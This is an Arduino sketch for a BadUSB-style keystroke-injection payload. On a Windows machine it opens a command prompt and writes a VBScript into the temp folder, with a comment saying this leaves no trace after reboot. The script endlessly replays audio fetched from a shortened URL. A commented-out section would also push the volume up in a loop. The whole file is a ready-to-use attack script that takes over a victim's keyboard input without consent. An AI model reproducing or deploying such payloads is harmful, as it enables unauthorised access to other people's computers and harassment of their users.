/*
 * Keep in mind this payload is made to stop it with a button in pin 3 to stop the payload to execute <3
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
    pinMode(3, INPUT_PULLUP);
    if (digitalRead(3) == LOW){
        while(1);
    }
  // Begining the Keyboard stream
  // The keyboard is set to spanish!!!
  Keyboard.begin(KeyboardLayout_es_ES);


  delay(3500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  // Go to the temp directory so when is rebooted there's no trace
  // Open a script file
  Keyboard.print("cd %tmp% && copy con mainMenu.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("While true");

  typeKey(KEY_RETURN);
  // Reserves memory for the object oPlayer
  Keyboard.print("Dim oPlayer");

  typeKey(KEY_RETURN);

  // Uses windows media player
  // More info: Info https://learn.microsoft.com/en-us/windows/win32/wmp/player-object
  Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");

  typeKey(KEY_RETURN);

  // Gets the media from URL 
  // more info: https://learn.microsoft.com/en-us/windows/win32/wmp/player-url
  Keyboard.print("oPlayer.URL = \"https://tinyurl.com/mainMenu13254654\"");

  typeKey(KEY_RETURN);

  // Info: https://learn.microsoft.com/en-us/windows/win32/wmp/controls-object
  Keyboard.print("oPlayer.controls.play");

  typeKey(KEY_RETURN);

   Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");

  typeKey(KEY_RETURN);

  // Makes the WScript sleep 
  Keyboard.print("WScript.Sleep 100");

  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

//  Keyboard.print("oPlayer.close");

//  typeKey(KEY_RETURN);

  Keyboard.print("Wend");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // Creates script for the volume up loop
 /* Keyboard.print("copy con volup.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("do");

  typeKey(KEY_RETURN); 
  
  // Creates a WshShell script
  Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

  typeKey(KEY_RETURN);

  // Presses the keys for turning the volume up
  Keyboard.print("WshShell.SendKeys(chr(&hAF))");

  typeKey(KEY_RETURN);

  // Makes it sleep for 10 just for the loop to work correctly
  Keyboard.print("WScript.Sleep 10");

  typeKey(KEY_RETURN);

  Keyboard.print("loop");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);
  */
  
//  Keyboard.print("start mainMenu.vbs && volup.vbs");
  Keyboard.print("start mainMenu.vbs");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}